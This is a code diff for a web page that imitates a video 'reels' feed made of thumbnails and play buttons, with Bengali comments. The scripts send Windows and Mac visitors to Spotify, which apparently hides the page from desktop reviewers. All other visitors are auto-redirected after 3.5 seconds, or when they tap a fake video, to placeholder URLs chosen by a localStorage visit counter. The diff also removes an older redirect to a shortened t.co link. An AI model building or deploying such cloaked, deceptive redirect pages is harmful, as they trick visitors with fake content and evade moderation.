@@ -1,34 +1,56 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 
+<!-- PC/Laptop Redirect -->
 <script>
-        // Function to detect if the user is on a PC or laptop
-        var userAgent = navigator.userAgent.toLowerCase();
-        
-        // Check for Windows or Mac OS (typical PC/laptop platforms)
-        if (userAgent.indexOf("windows") !== -1 || userAgent.indexOf("macintosh") !== -1) {
-            // Redirect to the desired URL for PC users
-            window.location.href = "https://open.spotify.com/";  // Replace with your shortened URL
-        }
-    </script>
-
-
-<script>
-window.addEventListener("load", function() {
-  setTimeout(function() {
-    var redirectLinks = [
-      "https://t.co/6fqL97ARPA"
-    ];
-
-    if (redirectLinks.length > 0) {
-      var randomLink = redirectLinks[Math.floor(Math.random() * redirectLinks.length)];
-      window.location.href = randomLink;
+    var userAgent = navigator.userAgent.toLowerCase();
+    if (userAgent.indexOf("windows") !== -1 || userAgent.indexOf("macintosh") !== -1) {
+        window.location.href = "https://open.spotify.com/"; 
     }
-  }, 400);
-});
+</script>
+
+<!-- Redirect Logic for Clicks and Auto-Redirect -->
+<script>
+    function handleRedirect() {
+        var urlA = "https://www.example.com/";
+        var urlB = "https://www.example1.com/";
+        var storageKey = "visit_redirect_data";
+        var resetTime = 86400000; // 24 Hours in milliseconds
+        var currentTime = Date.now();
+        var data;
+
+        // LocalStorage থেকে আগের ডেটা নেওয়া
+        try {
+            data = JSON.parse(localStorage.getItem(storageKey));
+        } catch(e) {
+            data = null;
+        }
+
+        // যদি ডেটা না থাকে বা ২৪ ঘণ্টা পার হয়ে যায়, তাহলে কাউন্ট ১ থেকে শুরু হবে
+        if (!data || (currentTime - data.time) >= resetTime) {
+            data = { count: 1, time: currentTime };
+        } else {
+            // তা না হলে কাউন্ট বাড়বে
+            data.count++;
+        }
+
+        // আপডেট করা ডেটা আবার সেভ করা
+        try {
+            localStorage.setItem(storageKey, JSON.stringify(data));
+        } catch(e) {}
+
+        // শর্ত অনুযায়ী লিংক নির্ধারণ: প্রথম ২ বার urlA, এরপর urlB
+        var targetLink = (data.count <= 2) ? urlA : urlB;
+        window.location.href = targetLink;
+    }
+
+    // Auto-redirect after 3.5 seconds
+    window.addEventListener("load", function() {
+        setTimeout(function() {
+            handleRedirect();
+        }, 3500);
+    });
 </script>
 
 <meta charset="UTF-8">
@@ -42,7 +64,6 @@ window.addEventListener("load", function() {
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
-
   gtag('config', 'G-5GGYWMV9G3');
 </script>
 
@@ -153,8 +174,6 @@ body{background:#000;color:#fff;overflow:hidden}
 <div class="reels-container" id="reelsContainer"></div>
 
 <script>
-const REDIRECT_URL = "https://t.co/6fqL97ARPA";
-
 const images = [
   "/up/image_01.webp","/up/image_02.webp","/up/image_03.webp",
   "/up/image_04.webp","/up/image_05.webp","/up/image_06.webp",
@@ -191,7 +210,10 @@ for (let i = 0; i < images.length; i++) {
 
   const reel = document.createElement("div");
   reel.className = "reel";
-  reel.onclick = () => window.location.href = REDIRECT_URL;
+  
+  // ভিডিওতে ক্লিক করলে handleRedirect ফাংশনটি কাজ করবে
+  reel.onclick = () => handleRedirect();
+  
   reel.innerHTML = `
     <img src="${img}" alt="">
     <div class="play-button"><img src="/up/27223.png" alt="play"></div>
